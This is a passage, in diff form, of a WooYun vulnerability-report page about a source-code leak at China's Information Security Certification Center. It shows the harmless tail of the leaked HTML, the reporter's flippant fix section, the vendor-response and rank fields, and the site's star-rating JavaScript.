+&lt;table width=&quot;1002&quot; border=&quot;0&quot; cellspacing=&quot;0&quot; cellpadding=&quot;0&quot; align=&quot;center&quot;&gt;<br />
+  &lt;tr&gt;<br />
+    &lt;td align=&quot;center&quot;&gt;&lt;iframe src=&quot;http://www.isccc.gov.cn/include/bottom_new.htm&quot; frameborder=&quot;0&quot; height=&quot;175&quot; width=&quot;1002&quot; marginwidth=&quot;0&quot; marginheight=&quot;0&quot; scrolling=&quot;no&quot;&gt;&lt;/iframe&gt;&lt;/td&gt;<br />
+  &lt;/tr&gt;<br />
+&lt;/table&gt;<br />
+<br />
+<br />
+&lt;/body&gt;<br />
+&lt;/html&gt;<br />
+&lt;%}%&gt;</code></pre><p class='detail'> </p>
+
+									<h3 class="detailTitle">修复方案：</h3>
+			<p class="detail">who knows ？<br />
+<br />
+<br />
+<br />
+你说呢？<br />
+<br />
+<br />
+<br />
+akast@ngsst.com </p>
+										<h3 class="detailTitle">版权声明：转载请注明来源 <a style="font-weight:normal" href="http://www.wooyun.org/whitehats/akast" title="akast">akast</a>@<a style="font-weight:normal" href="http://www.wooyun.org/bugs/wooyun-2010-02022" title="中国信息安全认证中心源代码泄露漏洞">乌云</a></h3>
+		<hr align="center"/>
+
+				
+			<h2>漏洞回应</h2>
+			
+			
+									<h3 class="detailTitle">厂商回应：</h3>
+										<p class="detail">未能联系到厂商或者厂商积极拒绝</p>
+																<p class="detail">漏洞Rank：4 (WooYun评价)</p>
+												
+					
+		
+<hr align="center" />
+<script type="text/javascript">
+var bugid="2022";
+var bugRating="-3";
+var myRating="";
+var ratingCount="0";
+
+
+
+function ShowBugRating(k){
+	var ratingItems=$(".myrating span");
+	$.each(ratingItems,function(i,n){
+		var nk=parseInt($(n).attr("rel"));
+		if(nk<=k){
+			$(n).addClass("on");
+		}else{
+			$(n).removeClass("on");
+		}
+	});
+	$(".myrating span").hover(
+		function(){
+			$("#ratingShow").html($(this).attr("data-title"));
+		},
+		function(){
+			$("#ratingShow").html("");
+		}
+	);
+}
+$(document).ready(function(){
+	if(myRating==""){
+		var ratingItems=$(".myrating span");
+		$(".myrating span").hover(
+			function(){
+				$(this).addClass("hover");
+				var k=parseInt($(this).attr("rel"));
+				$.each(ratingItems,function(i,n){
+					var nk=parseInt($(n).attr("rel"));
+					if(nk<k) $(n).addClass("on");
+					if(nk>k) $(n).removeClass("on");
+				});
+				$("#ratingShow").html($(this).attr("data-title"));
+			},
+			function(){
+				$(this).removeClass("hover");
+				if($("#myRating").val()==""){
+					$.each(ratingItems,function(i,n){
+						$(n).removeClass("on");
+					});
+				}
+				$("#ratingShow").html("");
+			}
+		);
+
+		$(".myrating span").click(function(){
+			var rating=$(this).attr("rel");
+			var k=parseInt($(this).attr("rel"));
+			$.post("/ajaxdo.php?module=bugrating",{"id":bugid,"rating":rating,"token":$("#token").val()},function(re){
+				//消除操作绑定
+				$(".myrating span").unbind();
+				re=parseInt(re);
+				switch(re){
+					case 1:
+						$("#ratingShow").html("评分成功");
+						$("#ratingSpan").html(parseInt($("#ratingSpan").html())+1);
+						$.each(ratingItems,function(i,n){
+							var nk=parseInt($(n).attr("rel"));
+							if(nk<=k){
+								$(n).addClass("on");
+							}else{
+								$(n).removeClass("on");
+							}
+						});
+						ShowBugRating(rating);
+						break;
+					case 2:
+						$("#ratingShow").html("请先登录");
+						break;
+					case 4:
+						$("#ratingShow").html("已对此漏洞进行过评分");
+						break;
+					case 6:
+						$("#ratingShow").html("不能对自己发布的漏洞进行评分");
+						break;
+					default:break;
+				}
+			});
+		});
+	}else{
+		if(ratingCount>2){
+			ShowBugRating(bugRating);
+		}else{
+			ShowBugRating(-3);
+		}
+	}
+});
+
+</script>
+<h3 class="detailTitle">漏洞评价：</h3>
+                        </div>
+                        </body>
+                        </html>
